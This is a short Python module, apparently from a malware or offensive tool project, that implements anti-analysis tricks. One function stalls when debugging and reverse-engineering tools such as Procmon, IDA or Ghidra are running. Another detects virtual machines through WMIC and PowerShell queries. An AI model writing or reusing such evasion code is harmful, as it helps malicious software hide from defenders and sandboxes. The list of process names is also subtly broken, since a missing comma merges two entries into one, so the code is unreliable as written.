import time
import sys
import psutil
from Utils.helpers import run_pwsh
# //TODO: add doc for this whole thing

def evade_debug():
    """Kind'a stupid. i should intercept things by winapi probably"""
    debug_process = ['procexp', 'procmon' 'autoruns', 'processhacker', 'ida', 'ghidra']
    for process in psutil.process_iter():
        for i in debug_process:
            if i in process.name().lower():
                time.sleep(99)


def detect_vm() -> bool:
    #false --> not vm, true --> vm
    """Stupid but working.
    //TODO: we have lot's of things to check before running this tests.
    this test is noisy and we should avoid it as much as we can."""
    commands = {'WMIC BIOS GET SERIALNUMBER': [],
                'WMIC COMPUTERSYSTEM GET MODEL': ['HVM domU', 'Virtual Machine', 'VirtualBox', 'KVM',
                                                  'VMware Virtual Platform'],
                'WMIC COMPUTERSYSTEM GET MANUFACTURER': ['innotek GmbH', 'VMware, Inc.', 'Microsoft Corporation',
                                                         'Xen',
                                                         'Red Hat']}
    an = "Get-WmiObject Win32_PortConnector"
    q = run_pwsh(an)
    if 'tag' in q.lower():
        return True
    for k, v in commands.items():
        j = run_pwsh(k)
        for output in v:
            if output in j:
                return True
    return False
